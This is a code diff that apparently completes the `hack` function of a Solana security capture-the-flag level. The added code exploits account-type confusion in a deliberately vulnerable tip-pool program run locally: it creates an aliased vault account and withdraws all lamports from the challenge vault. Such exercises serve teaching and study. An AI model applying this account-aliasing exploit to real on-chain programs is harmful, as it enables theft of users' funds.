@@ -1,15 +1,18 @@
 use std::{env, str::FromStr};
 
-use level3::{TipPool, TIP_POOL_LEN};
+use level3::{TIP_POOL_LEN, TipInstruction, TipPool};
 
 use owo_colors::OwoColorize;
 use poc_framework::solana_sdk::signature::Keypair;
 use poc_framework::{
     keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
 };
+use solana_program::instruction::{AccountMeta, Instruction};
 use solana_program::native_token::lamports_to_sol;
 
+use borsh::BorshSerialize;
 use pocs::assert_tx_success;
+use solana_program::sysvar;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
 
 #[allow(dead_code)]
@@ -23,8 +26,64 @@ struct Challenge {
     vault_address: Pubkey,
 }
 
-// Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    // ** Generate a new deterministic Vault Address ** //
+    let seed: u8 = 1;
+    let hacker_vault_address =
+        Pubkey::create_program_address(&[&[seed]], &challenge.tip_program).unwrap();
+
+    // ** Create the Hacker Vault ** //
+    env.execute_as_transaction(
+        &[level3::initialize(
+            challenge.tip_program,
+            hacker_vault_address,      // new vault's address
+            challenge.hacker.pubkey(), // initializer_address. Aliases with TipPool::withdraw_authority
+            seed,                      // seed != original seed, so we can create an account
+            2.0,                       // some fee. Aliases with TipPool::amount (note u64 != f64. Any value >1.0 is a huge u64)
+            challenge.vault_address,   // fee_recipient. Aliases with TipPool::vault
+        )],
+        &[&challenge.hacker],
+    )
+    .print();
+
+    // ** Get tip program lamports ** //
+    let mut amount_to_steal = env.get_account(challenge.tip_program).unwrap().lamports;
+    println!("[BEFORE] Tip Program has {} lamports available to steal.", amount_to_steal);
+
+    // ** Get amount of lamports in the vault ** //
+    let mut amount = env.get_account(challenge.vault_address).unwrap().lamports;
+    println!("[BEFORE] Vault has {} lamports ripe for the taking...", amount);
+
+    // ** Withdraw the lamports from the vault ** //
+    env.execute_as_transaction(
+        &[level3::withdraw(
+            challenge.tip_program,
+            challenge.vault_address,
+            hacker_vault_address,
+            challenge.hacker.pubkey(),
+            amount,
+        )],
+        &[&challenge.hacker],
+    )
+    .print();
+
+    // ** Get tip program lamports ** //
+    amount_to_steal = env.get_account(challenge.tip_program).unwrap().lamports;
+    println!("[AFTER] Tip Program has {} lamports available to steal.", amount_to_steal);
+
+    // !! If we successfully rip all lamports, the vault will be purged !! //
+    match env.get_account(challenge.vault_address) {
+        Some(v) => {
+            // ?? Saddage, we should have purged the vault. ?? //
+            amount  = v.lamports;
+            println!("[AFTER] Vault has {} lamports left :(", amount);
+        }
+        None => {
+            // ** Successfully ripped all lamports ** //
+            println!("[AFTER] Vault has been purged! Nabbed {} lamports :D", amount);
+        }
+    }
+}
 
 /*
 SETUP CODE BELOW
